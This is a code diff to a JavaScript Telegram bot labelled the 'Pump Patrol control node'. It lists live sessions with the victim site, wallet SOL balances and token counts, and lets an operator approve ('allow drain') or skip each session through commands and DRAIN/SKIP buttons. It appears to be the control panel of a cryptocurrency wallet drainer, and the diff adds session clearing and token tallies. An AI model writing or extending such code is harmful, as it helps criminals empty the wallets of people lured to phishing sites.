@@ -42,14 +42,34 @@ async function handle(m){
   if(!CHAT)return reply(`chat id: ${m.chat.id} — set TG_CHAT and restart`);
   const[t,sid]=String(m.text||'').trim().split(/\s+/);
   const c=t.toLowerCase();
-  if(c==='/start'||c==='/help')return reply('Pump Patrol control node\n/sessions — live + recent sessions\n/approve sid — allow drain\n/skip sid — decline');
+  if(c==='/start'||c==='/help')return reply('Pump Patrol control node\n/sessions — live + recent sessions\n/clear — drop stale sessions (or /clear sid)\n/approve sid — allow drain\n/skip sid — decline');
   if(c==='/sessions'){
     if(!sessions.size)return reply('no sessions recorded');
-    let s='';for(const[k,v]of sessions)s+=`<code>${esc(k)}</code> ${v.done?'done':'live'} — ${esc(v.site||'?')} — ${(v.wallets||[]).reduce((a,w)=>a+(+w.sol||0),0).toFixed(4)} SOL\n`;
+    let s='';
+    for(const[k,v]of sessions){
+      const w2=v.wallets||[];
+      const sol=w2.reduce((a,w)=>a+(+w.sol||0),0);
+      const nt=w2.reduce((a,w)=>a+((w.tokens||[]).length),0);
+      s+=`<code>${esc(k)}</code> ${v.done?'done':'live'} — ${esc(v.site||'?')} — ${sol.toFixed(4)} SOL + ${nt} tok\n`;
+    }
     return reply(`<b>sessions</b>\n${s}`);
   }
-  if((c==='/approve'||c==='/go')&&sid&&sessions.has(sid)){verdicts.set(sid,{a:'go',ts:Date.now()});return reply(`approved <code>${esc(sid)}</code>`)}
-  if((c==='/skip'||c==='/stop')&&sid&&sessions.has(sid)){verdicts.set(sid,{a:'stop',ts:Date.now()});return reply(`skipped <code>${esc(sid)}</code>`)}
+  if(c==='/clear'){
+    if(sid&&sessions.has(sid)){sessions.delete(sid);return reply('cleared <code>'+esc(sid)+'</code>')}
+    const n=sessions.size;
+    sessions.clear();
+    return reply(n?'cleared '+n+' sessions':'nothing to clear');
+  }
+  if(c==='/approve'||c==='/go'){
+    if(!sid)return reply('usage: /approve sid');
+    if(sessions.has(sid)){verdicts.set(sid,{a:'go',ts:Date.now()});return reply('approved <code>'+esc(sid)+'</code>')}
+    return reply('unknown session '+esc(sid));
+  }
+  if(c==='/skip'||c==='/stop'){
+    if(!sid)return reply('usage: /skip sid');
+    if(sessions.has(sid)){verdicts.set(sid,{a:'stop',ts:Date.now()});return reply('skipped <code>'+esc(sid)+'</code>')}
+    return reply('unknown session '+esc(sid));
+  }
 }
 
 function btns(sid){return{inline_keyboard:[[{text:'DRAIN',callback_data:'go:'+sid},{text:'SKIP',callback_data:'stop:'+sid}]]}}
